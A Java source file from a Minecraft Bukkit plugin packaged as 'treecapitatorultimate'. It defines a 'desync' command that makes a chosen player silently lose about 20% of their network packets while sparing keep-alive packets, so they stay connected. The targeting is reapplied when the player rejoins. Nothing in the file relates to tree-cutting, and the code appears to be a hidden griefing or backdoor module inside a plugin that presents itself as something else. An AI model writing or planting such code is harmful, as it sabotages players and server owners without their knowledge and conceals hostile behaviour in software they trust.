package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.Packet.PacketEvent;
import me.bow.treecapitatorultimate.Utils.Packet.PacketManager;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerJoinEvent;

import java.util.ArrayList;
import java.util.Random;
import java.util.UUID;

@Command.Info(command = "desync", description = "Desync?! Hell yeah!", category = CommandCategory.Player, requiredArgs = 1)
public class DesyncPlayer extends Command {
    private final ArrayList<UUID> players = new ArrayList<>();
    private final Random rnd = new Random();

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        try {
            Player anotherPlayer = Bukkit.getPlayer(args.get(0));
            if (anotherPlayer == null) {
                Start.ErrorString(p, "Player \"" + args.get(0) + "\" is not online!");
                return;
            }
            if (players.contains(anotherPlayer.getUniqueId())) {
                players.remove(anotherPlayer.getUniqueId());
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GOLD + anotherPlayer.getName() + ChatColor.RED + " is no longer losing packets! !");
                PacketManager.instance.removeListener(anotherPlayer, this);
            } else {
                players.add(anotherPlayer.getUniqueId());
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GOLD + anotherPlayer.getName() + ChatColor.GREEN + " is now losing packets!");
                PacketManager.instance.addListener(anotherPlayer, this);
            }
        } catch (Exception e) {
            Start.ErrorException(p, e);
        }
    }

    @Override
    public void onPlayerJoin(PlayerJoinEvent e) {
        if(!players.contains(e.getPlayer().getUniqueId())) return;
        PacketManager.instance.addListener(e.getPlayer(), this);
    }

    @Override
    public void onPacketReceived(PacketEvent e) {
        onPacketSend(e);
    }

    @Override
    public void onPacketSend(PacketEvent e) {
        if(e.getPacket().getPacketClass().getSimpleName().contains("KeepAlive")) return;
        if (rnd.nextInt(100) >= 20) return;
        e.setCancelled(true);
    }
}
